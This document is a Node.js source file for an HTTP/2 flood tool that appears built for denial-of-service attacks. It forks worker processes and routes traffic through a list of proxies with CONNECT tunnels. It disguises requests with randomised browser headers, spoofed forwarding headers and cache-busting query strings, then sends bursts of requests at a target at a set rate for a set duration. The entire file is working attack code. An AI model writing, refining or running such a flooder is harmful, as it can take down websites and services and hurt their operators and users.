const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
const UserAgent = require('user-agents');

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', function (exception) {});

if (process.argv.length < 7) { console.log(`Usage: target time rate thread proxyfile`); process.exit(); }

const headers = {};
function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    Rate: parseInt(process.argv[4]),
    threads: parseInt(process.argv[5]),
    proxyFile: process.argv[6]
};

const sig = [
    'ecdsa_secp256r1_sha256',
    'rsa_pkcs1_sha384',
    'rsa_pkcs1_sha512',
    'hmac_sha256',
    'ecdsa_secp384r1_sha384',
    'rsa_pkcs1_sha1',
    'hmac_sha1'
];

const accept_header = [
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    '*/*',
    'image/*',
    'image/webp,image/apng',
    'text/html',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'application/json',
    'application/xml',
    'application/pdf',
    'text/css',
    'application/javascript'
];

const lang_header = [
    'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'ko-KR',
    'en-US',
    'zh-CN',
    'zh-TW',
    'en-ZA',
    'fr-FR',
    'ja-JP',
    'ar-EG',
    'de-DE',
    'es-ES'
];

const encoding_header = [
    'gzip, deflate, br',
    'deflate',
    'gzip, deflate, lzma, sdch',
    'identity',
    'compress',
    'br'
];

const methods = [
    "GET", "HEAD", "POST", "DELETE", "PATCH"
];

const cache_control = [
    'max-age=0',
    'no-cache',
    'no-store',
    'must-revalidate'
];

const sec_ch_ua = [
    '"Chromium";v="137", "Not/A)Brand";v="24"',
    '"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
    '"Microsoft Edge";v="137", "Chromium";v="137", "Not/A)Brand";v="24"'
];

const sec_ch_ua_platform = [
    "Linux",
    "Windows",
    "macOS",
    "Android",
    "iOS"
];

const rateHeaders = [
    { "akamai-origin-hop": randstr(12) },
    { "proxy-client-ip": randstr(12) },
    { "via": randstr(12) },
    { "cluster-ip": randstr(12) },
    { "user-agent": randstr(12) }
];

const proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);

if (cluster.isMaster) {
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
    console.clear();
    console.log('\x1b[1m\x1b[34m' + 'Target: ' + '\x1b[0m' + '\x1b[1m' + parsedTarget.host + '\x1b[0m');
    console.log('\x1b[1m\x1b[33m' + 'Duration: ' + '\x1b[0m' + '\x1b[1m' + args.time + '\x1b[0m');
    console.log('\x1b[1m\x1b[32m' + 'Threads: ' + '\x1b[0m' + '\x1b[1m' + args.threads + '\x1b[0m');
    console.log('\x1b[1m\x1b[31m' + 'Requests per second: ' + '\x1b[0m' + '\x1b[1m' + args.Rate + '\x1b[0m');
} else {
    setInterval(runFlooder);
}

class NetSocket {
    constructor() {}

    HTTP(options, callback) {
        const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
        const buffer = new Buffer.from(payload);

        const connection = net.connect({
            host: options.host,
            port: options.port,
            noDelay: true
        });

        connection.setTimeout(options.timeout * 100000);
        connection.setKeepAlive(true, 100000);

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            const isAlive = response.includes("HTTP/1.1 200");
            if (isAlive === false) {
                connection.destroy();
                return callback(undefined, "error: invalid response from proxy server");
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout exceeded");
        });

        connection.on("error", error => {
            connection.destroy();
            return callback(undefined, "error: " + error);
        });
    }
}

function generateUserAgent() {
    const userAgent = new UserAgent({
        deviceCategory: randomElement(['desktop', 'mobile', 'tablet']),
        platform: randomElement(['Win32', 'MacIntel', 'Linux x86_64', 'iPhone', 'Android'])
    });
    return userAgent.toString();
}

const Socker = new NetSocket();

headers[":method"] = randomElement(methods);
headers[":authority"] = parsedTarget.host;
headers[":path"] = parsedTarget.path + "?" + randstr(10) + "=" + randstr(5);
headers[":scheme"] = "https";
headers["user-agent"] = generateUserAgent();
headers["accept"] = randomElement(accept_header);
headers["accept-encoding"] = randomElement(encoding_header);
headers["accept-language"] = randomElement(lang_header);
headers["cache-control"] = randomElement(cache_control);
headers["sec-ch-ua"] = randomElement(sec_ch_ua);
headers["sec-ch-ua-mobile"] = "?0";
headers["sec-ch-ua-platform"] = randomElement(sec_ch_ua_platform);
headers["sec-fetch-dest"] = "document";
headers["sec-fetch-mode"] = "navigate";
headers["sec-fetch-site"] = "none";
headers["sec-fetch-user"] = "?1";
headers["upgrade-insecure-requests"] = "1";
headers["x-requested-with"] = "XMLHttpRequest";

function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");

    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host + ":443",
        timeout: 15
    };

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) {
            connection.close();
            connection.destroy();
            return;
        }

        const tlsOptions = (() => {
            const useTlsOption2 = (Math.random() < 0.5);
            return useTlsOption2 ?
                {
                    secure: true,
                    ALPNProtocols: ['h2'],
                    sigals: randomElement(sig),
                    socket: connection,
                    ciphers: 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384',
                    ecdhCurve: 'P-256:P-384',
                    host: parsedTarget.host,
                    servername: parsedTarget.host,
                    rejectUnauthorized: false
                } :
                {
                    secure: true,
                    ALPNProtocols: ['h2'],
                    ciphers: 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384',
                    ecdhCurve: 'auto',
                    rejectUnauthorized: false,
                    servername: parsedTarget.host,
                    secureOptions: crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION |
                        crypto.constants.SSL_OP_NO_TICKET |
                        crypto.constants.SSL_OP_NO_COMPRESSION |
                        crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
                        crypto.constants.SSL_OP_NO_RENEGOTIATION |
                        crypto.constants.SSL_OP_SINGLE_DH_USE |
                        crypto.constants.SSL_OP_SINGLE_ECDH_USE |
                        crypto.constants.SSL_OP_NO_QUERY_MTU
                };
        })();

        const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
        tlsConn.setKeepAlive(true, 60000);

        const client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            settings: {
                headerTableSize: 65536,
                maxConcurrentStreams: 50000,
                initialWindowSize: 6291456,
                maxHeaderListSize: 65536,
                enablePush: false
            },
            createConnection: () => tlsConn
        });

        client.on("connect", () => {
            const IntervalAttack = setInterval(() => {
                const dynHeaders = {
                    ...headers,
                    ...rateHeaders[Math.floor(Math.random() * rateHeaders.length)]
                };
                for (let i = 0; i < args.Rate; i++) {
                    const request = client.request(dynHeaders);
                    request.on("response", response => {
                        request.close();
                        request.destroy();
                        return;
                    });
                    request.end();
                }
            }, 250);
        });

        client.on("close", () => {
            client.destroy();
            return;
        });
    });
}

const killer = () => process.exit(1);
setTimeout(killer, args.time * 1000);
